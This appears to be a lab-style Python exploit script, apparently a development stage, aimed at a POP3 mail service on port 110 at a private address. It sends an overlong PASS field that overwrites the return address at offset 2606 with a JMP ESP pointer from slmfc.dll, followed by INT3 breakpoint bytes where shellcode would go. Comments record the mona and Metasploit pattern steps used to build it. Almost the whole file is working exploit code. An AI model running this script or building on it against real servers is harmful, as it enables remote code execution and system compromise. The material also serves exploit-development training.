#!/usr/bin/env python

import socket
import struct

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.166',110))

# jmp esp --
# !mona jmp -r esp -cpb "\x00\x0A\x0D"

# msf-nasm_shell                                                                                          
# 	nasm > jmp esp                                                                                                                                           
# 	00000000  FFE4              jmp esp                                                                                                                      
#	nasm >
  
# !mona find -s "\xff\xe4" -m slmfc.dll
ptr_jmp_esp = 0x5f4a358f

# buffer --
# msf-pattern_offset -l 2700 -q 39694438
# [*] Exact match at offset 2606
b_totlen = 2700 # payload len
e_offset = 2606 # eip

# offsets --
# add badchar_test to payload --
buf = ""
buf += "A"*(e_offset - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "\xCC\xCC\xCC\xCC" # esp INT3 
buf += "D"*(b_totlen - len(buf))

# here we go --
s.send('USER dirtbag' + '\r\n')
data = s.recv(1024)

s.send('PASS ' + buf + '\r\n')
data = s.recv(1024)
s.close()

